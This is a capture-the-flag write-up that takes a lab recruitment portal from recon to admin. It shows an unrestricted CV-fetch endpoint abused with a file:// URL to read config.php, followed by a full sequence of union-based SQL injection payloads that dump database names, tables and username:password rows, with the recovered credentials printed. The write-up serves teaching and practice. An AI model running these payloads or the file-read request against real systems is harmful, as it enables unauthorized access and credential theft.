---
title: "Recruit"
date: 2026-11-15
description: "A recruitment portal taken from recon to admin: a URL-fetch endpoint that reads local files, then union-based SQL injection in the candidate search."
category: ctf
status: solved
tools: [nmap, gobuster]
tags: [web, lfi, sql-injection, union-based, enumeration]
---

A recruitment portal, "Recruit". The path to the admin flag ran through two flaws: a candidate-CV endpoint that fetches any URL, which let me read the application's config, and a union-based SQL injection in the candidate search, which gave up the admin login. I started with service and directory enumeration, read a leaked internal email for clues, used the fetch endpoint to recover the HR password, logged in, and then injected the search box to walk the database down to the admin credentials.

## 1. Recon

### Service scan

```bash title="Service and version scan"
$ nmap -sV 10.48.176.241
```

Three services were open: SSH on 22, DNS (domain) on 53, and HTTP on 80.

![[recruit-01-nmap.png|Nmap: SSH, DNS and HTTP open on the target]]

### Web directory enumeration

With HTTP open, I enumerated directories with Gobuster:

```bash title="Directory brute force"
$ gobuster dir -u http://10.48.176.241 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It returned `/mail`, `/assets`, `/phpmyadmin` and a forbidden `/server-status`.

![[recruit-02-gobuster.png|Gobuster finds /mail, /assets and /phpmyadmin]]

## 2. Clues in the mail

`/mail` exposed an internal mail log with a "Recruitment Portal Deployment Confirmation" email. It read like a normal deployment note, but it leaked three things an attacker wants:

![[recruit-03-mail.png|The leaked deployment email on /mail]]

- The **HR username is `hr`**.
- The **HR credentials are stored in the application config file** (`config.php`) "for ease of access during the initial rollout phase".
- The **administrator credentials are kept in the backend database**, not in the config.

So two different credential sets, in two different places. The email told me exactly where to look for each.

## 3. The candidate-CV endpoint

On the login page I tried injecting XSS and SQL. Neither worked, so the front door was not the way in.

Looking further, the API documentation page (`api.php`) described an endpoint used to fetch a candidate's CV from a URL:

```http
GET /file.php?cv=<URL>
```

### Analysis

This endpoint takes a URL from the user and fetches it **on the server**, then returns the content. It is meant for `http(s)://` links to a CV, but it does not restrict the URL scheme. A server-side fetch that accepts any scheme can be pointed back at the server's own file system with `file://`, which turns a "fetch a CV" feature into an arbitrary local-file read (a local file inclusion / SSRF). The email had already told me the HR password lives in `config.php`, and a PHP app's config usually sits at `/var/www/html/config.php`, so that was the file to ask for.

### Reading the config

```text title="Request"
http://10.48.176.241/file.php?cv=file:///var/www/html/config.php
```

The endpoint happily returned the raw PHP config, including the HR password:

![[recruit-04-config-lfi.png|file.php returns config.php, revealing the HR password]]

> [!flag] HR password recovered
> hrpassword123

## 4. HR access and the first flag

Using `hr` / the recovered password on the login page dropped me into the HR dashboard (`dashboard.php`), which showed the candidate list and the **HR flag**.

![[recruit-05-hr-dashboard.png|The HR dashboard with the HR flag (redacted here)]]

> [!flag] First flag
> The HR flag is shown on the HR dashboard above.

## 5. Admin access through SQL injection

The dashboard had a **candidate search** box. XSS did nothing, but a single quote in the search broke the query, so I tested it for SQL injection.

### Confirming the injection and the column count

```sql
' ORDER BY 5-- -
```

The page returned a SQL error, `Unknown column '5' in 'order clause'`. That both confirms the injection and tells me the query has fewer than 5 columns.

![[recruit-06-sqli-orderby.png|ORDER BY 5 errors: the query has 4 columns]]

`ORDER BY 4` worked, so the query has **4 columns**.

### Finding which columns are reflected

```sql
' UNION SELECT 1,2,3,4-- -
```

The markers `2`, `3` and `4` appeared in the results table, so those columns are printed back in the response and can carry data out.

![[recruit-07-sqli-union-columns.png|UNION SELECT 1,2,3,4 shows the reflected columns]]

### Listing the databases

```sql
' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4 FROM information_schema.schemata-- -
```

This dumped every database on the server. The application's own one is **`recruit_db`**.

![[recruit-08-sqli-schemas.png|All databases, including recruit_db]]

### Listing the tables in recruit_db

```sql
' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema='recruit_db'-- -
```

Two tables: `candidates` and **`users`**.

![[recruit-09-sqli-tables.png|recruit_db holds candidates and users]]

### Listing the columns in users

```sql
' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='users'-- -
```

Among the columns were `username` and `password` — the two I needed.

![[recruit-10-sqli-columns.png|The users table has username and password columns]]

### Dumping the credentials

```sql
' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password),4 FROM users-- -
```

`0x3a` is the hex for `:`, so each row comes back as `username:password`. The query returned the admin login.

![[recruit-11-sqli-credentials.png|The admin username and password from the users table]]

> [!flag] Admin credentials
> admin:admin@001admin

## 6. Final flag

Logging in with the admin credentials gave the admin view of the dashboard, with Approve/Reject actions on each candidate and the **admin flag**.

![[recruit-12-admin-dashboard.png|The admin dashboard with the admin flag (redacted here)]]

> [!flag] Final flag
> The admin flag is shown on the admin dashboard above.

---

## The chain of vulnerabilities

1. **Information disclosure.** An internal mail log was reachable at `/mail` and leaked where each set of credentials was stored.
2. **Credentials in source.** The HR password was hard-coded in `config.php` instead of being kept out of the web root.
3. **URL-fetch local file read.** `/file.php?cv=` fetched any URL server-side without restricting the scheme, so `file://` read `config.php` and handed over the HR password.
4. **Union-based SQL injection.** The candidate search put input straight into the query, which let me read the whole database and recover the admin login.

Each flaw was small on its own; chained, they went from an open port to full admin.

## Explanation of each query

| Query | What it does |
| --- | --- |
| `nmap -sV 10.48.176.241` | Scans the target and identifies the service and version on each open port. |
| `gobuster dir -u … -w …` | Brute-forces directory and file names against the web server to find hidden paths. |
| `/file.php?cv=file:///var/www/html/config.php` | Abuses the CV-fetch endpoint with a `file://` URL to read a local file instead of a remote CV. |
| `' ORDER BY 5-- -` | Sorts by column 5 to probe the column count; the error shows there are only 4. |
| `' UNION SELECT 1,2,3,4-- -` | Appends a second result set to see which of the 4 columns are printed back. |
| `' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4 FROM information_schema.schemata-- -` | Lists every database name through a reflected column. |
| `' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema='recruit_db'-- -` | Lists the tables inside `recruit_db`. |
| `' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='users'-- -` | Lists the column names in the `users` table. |
| `' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password),4 FROM users-- -` | Dumps each user as `username:password` (`0x3a` is `:`). |

## What I learned

- A feature that fetches a URL for you is a file read waiting to happen if it does not pin the scheme and host. "Fetch a CV" became "read any file on the box".
- Enumeration pays twice: the mail log did not just give a password, it told me exactly where both credential sets lived, which turned the rest into following directions.
- Union-based SQL injection is methodical, not magic: count the columns, find the reflected ones, then walk `information_schema` down from databases to tables to columns to data.
